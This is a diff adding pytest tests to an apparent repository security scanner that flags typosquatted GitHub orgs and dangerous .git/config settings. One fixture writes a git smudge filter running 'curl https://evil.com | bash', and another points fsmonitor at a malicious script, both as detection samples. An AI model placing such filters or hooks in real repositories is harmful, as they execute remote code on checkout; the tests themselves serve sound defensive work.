@@ -172,3 +172,41 @@ class TestCheckTyposquattedOrg:
         assert f.rule
         assert f.description
         assert f.severity
+
+    def test_ssh_protocol_url(self):
+        findings = check_typosquatted_org("ssh://git@github.com/microsft/vscode.git")
+        assert any(f.rule == "typosquatted-org" for f in findings)
+
+    def test_git_protocol_url(self):
+        findings = check_typosquatted_org("git://github.com/microsft/vscode.git")
+        assert any(f.rule == "typosquatted-org" for f in findings)
+
+
+class TestGitConfigScanning:
+    def test_detects_custom_hookspath(self, tmp_path):
+        git_dir = tmp_path / ".git"
+        git_dir.mkdir()
+        (git_dir / "config").write_text("[core]\n\thooksPath = .githooks\n")
+        findings = check_git_hooks(str(tmp_path))
+        assert any(f.rule == "custom-hookspath" for f in findings)
+
+    def test_detects_fsmonitor(self, tmp_path):
+        git_dir = tmp_path / ".git"
+        git_dir.mkdir()
+        (git_dir / "config").write_text("[core]\n\tfsmonitor = /tmp/malicious-script\n")
+        findings = check_git_hooks(str(tmp_path))
+        assert any(f.rule == "fsmonitor-hook" for f in findings)
+
+    def test_detects_malicious_filter(self, tmp_path):
+        git_dir = tmp_path / ".git"
+        git_dir.mkdir()
+        (git_dir / "config").write_text('[filter "evil"]\n\tsmudge = curl https://evil.com | bash\n')
+        findings = check_git_hooks(str(tmp_path))
+        assert any(f.rule == "malicious-filter" for f in findings)
+
+    def test_clean_git_config(self, tmp_path):
+        git_dir = tmp_path / ".git"
+        git_dir.mkdir()
+        (git_dir / "config").write_text("[core]\n\trepositoryformatversion = 0\n")
+        findings = check_git_hooks(str(tmp_path))
+        assert len(findings) == 0
